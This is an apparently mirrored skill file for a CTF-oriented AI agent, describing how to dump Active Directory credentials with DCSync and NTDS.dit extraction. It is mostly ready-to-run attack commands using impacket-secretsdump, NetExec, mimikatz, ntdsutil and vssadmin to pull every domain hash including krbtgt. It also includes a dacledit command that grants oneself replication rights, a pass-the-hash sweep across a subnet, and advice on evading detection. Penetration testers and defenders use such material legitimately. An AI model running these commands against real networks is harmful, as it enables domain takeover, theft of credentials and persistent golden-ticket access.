# DCSync and NTDS Dumping

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/dcsync-dump.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/dcsync-dump.md)

---

---
name: dcsync-dump
category: active-directory
triggers: ["dcsync", "secretsdump", "ntds", "ntds.dit", "DRSUAPI", "GetChanges", "GetChangesAll", "krbtgt", "dump hashes", "replication rights", "domain dump"]
tools: ["impacket-secretsdump", "netexec/nxc", "mimikatz", "certipy", "vssadmin", "ntdsutil"]
priority: high
description: Abuse directory-replication rights (or DC admin) to pull all domain credential material, including krbtgt, via DCSync or NTDS.dit dumping.
---
# DCSync and NTDS Dumping

## Trigger context
This is usually the cash-out step. You have either (a) an account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (GetChanges/GetChangesAll — held by DA/EA/DCs by default, or granted via ACL abuse), or (b) admin on a DC. Either lets you extract every account's NT hash, including `krbtgt` (which enables Golden Tickets).

## Objective
Extract domain credential material:
- Targeted DCSync of a single high-value account (e.g. `Administrator`, `krbtgt`).
- Full domain dump (all users' NT hashes, Kerberos keys, cleartext where reversible).

## Methodology (decision tree)
```
Do you have replication rights (GetChanges + GetChangesAll)?  (check BloodHound "DCSync" edge)
├── YES → secretsdump -just-dc (remote DRSUAPI, no code exec on DC needed)
│         ├── Just need krbtgt for golden ticket → -just-dc-user krbtgt
│         └── Full sweep → -just-dc → parse .ntds
└── NO, but admin on the DC?
          ├── secretsdump ADMIN@DC (SAM+LSA+NTDS via remote registry/vss)
          └── On-box: ntdsutil / vssadmin snapshot → copy NTDS.dit + SYSTEM → offline parse
No rights at all? → get them first: ACL abuse (WriteDACL on domain) grants DCSync, or ESC8/relay → DA
```

## Commands & payloads
```bash
# --- Remote DCSync via DRSUAPI (needs replication rights; no shell on DC) ---
impacket-secretsdump -just-dc corp.local/jdoe:'Passw0rd!'@DC_IP -outputfile domain_dump
impacket-secretsdump -just-dc-ntlm corp.local/jdoe:'Passw0rd!'@DC_IP     # NT hashes only, faster
impacket-secretsdump -just-dc-user krbtgt corp.local/jdoe:'Passw0rd!'@DC_IP   # single account

# --- With NT hash (pass-the-hash) or Kerberos ticket ---
impacket-secretsdump -just-dc -hashes :NTHASH corp.local/jdoe@DC_IP
KRB5CCNAME=jdoe.ccache impacket-secretsdump -k -no-pass -just-dc corp.local/jdoe@DC_HOST_FQDN

# --- Full box dump when you are LOCAL ADMIN on the DC (SAM + LSA + NTDS) ---
impacket-secretsdump corp.local/Administrator:'AdminPass'@DC_IP
impacket-secretsdump -hashes :NTHASH ADMINISTRATOR@DC_IP    # PtH to admin box

# --- NetExec: DCSync / NTDS dump ---
nxc smb DC_IP -u jdoe -p 'Passw0rd!' -M dcsync                     # uses replication rights
nxc smb DC_IP -u Administrator -p 'AdminPass' --ntds               # dump NTDS.dit (needs DC admin)
nxc smb DC_IP -u Administrator -H NTHASH --ntds --user krbtgt      # targeted
```

Windows equivalents:
```powershell
# Mimikatz DCSync (needs replication rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
# On-DC NTDS extraction (local admin on DC)
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit
vssadmin create shadow /for=C:      # then copy NTDS.dit + SYSTEM hive, parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL    # offline parse of collected files
```

## Branching logic
- Need domain persistence / Golden Ticket -> grab `krbtgt` NT hash + domain SID, then forge (see pth-ptt-lateral).
- Only want one admin's hash to move -> `-just-dc-user Administrator` -> pass-the-hash.
- No replication rights but BloodHound shows `WriteDACL`/`GenericAll` on the domain object -> grant yourself DCSync:
  ```bash
  # e.g. via bloodyAD / dacledit
  dacledit.py -action write -rights DCSync -principal jdoe -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd!'
  ```
- Got a DC machine cert (ESC8) -> `certipy auth -pfx dc.pfx` gives the DC's hash/TGT -> then DCSync.

Parsing and reusing the dump:
```bash
# extract just NThashes (user:nthash) for a hashcat/PtH sweep
awk -F: '{print $1":"$4}' domain_dump.ntds > nt_hashes.txt
# spray the pulled hashes across the estate (find where each is local admin)
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH --local-auth
# grab the domain SID (needed for golden tickets)
impacket-lookupsid corp.local/jdoe:'Passw0rd!'@DC_IP 0 | grep 'Domain SID'
```

## Common pitfalls
- Relayed NTLM cannot DCSync: DRSUAPI always requires signing (only works vs Zerologon-vulnerable DCs). Use replication rights over an authenticated channel instead.
- `-just-dc` requires BOTH GetChanges and GetChangesAll; GetChanges alone is insufficient.
- Kerberos runs need the DC's FQDN (not IP) and correct clock; skew -> failure.
- Dumping full NTDS is loud (Event 4662 on the DC); prefer targeted `-just-dc-user` when you only need one account.
- Offline NTDS parse needs the matching `SYSTEM` hive from the same host — the boot key differs per machine.
- `machine$` and `krbtgt` hashes are shown in the `.ntds`; `krbtgt` never changes unless reset (reset it TWICE to invalidate golden tickets — defensive note).

OPSEC / detection notes:
- DCSync via DRSUAPI from a non-DC source IP is highly anomalous (Event 4662 with the replication GUIDs); a single targeted `-just-dc-user` is far quieter than a full sweep.
- Full NTDS extraction on-box (ntdsutil/vss) touches shadow copies and is EDR-visible.
- After grabbing `krbtgt`, resist forging immediately in noisy engagements — the hash alone is enough leverage.

## Proof / verification
- Output `domain_dump.ntds` contains lines `user:RID:LMHASH:NTHASH:::`.
- Validate a pulled hash: `nxc smb DC_IP -u Administrator -H NTHASH` -> `(Pwn3d!)`.
- `krbtgt` line present + domain SID (from `nxc ... --rid-brute` or `lookupsid`) = golden-ticket ready.

## Cross-references
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — use dumped NT hashes (PtH) and forge Golden/Silver tickets with krbtgt.
- [sa--instructions--active-directory--adcs-esc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--adcs-esc.md) / [sa--instructions--active-directory--ntlm-relay-coerce.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ntlm-relay-coerce.md) — how ESC8/relay yields a DC identity to DCSync with.
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — confirm the DCSync edge before attempting.

## Credible sources
- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html
- https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds
- https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
- https://adsecurity.org/?p=1729
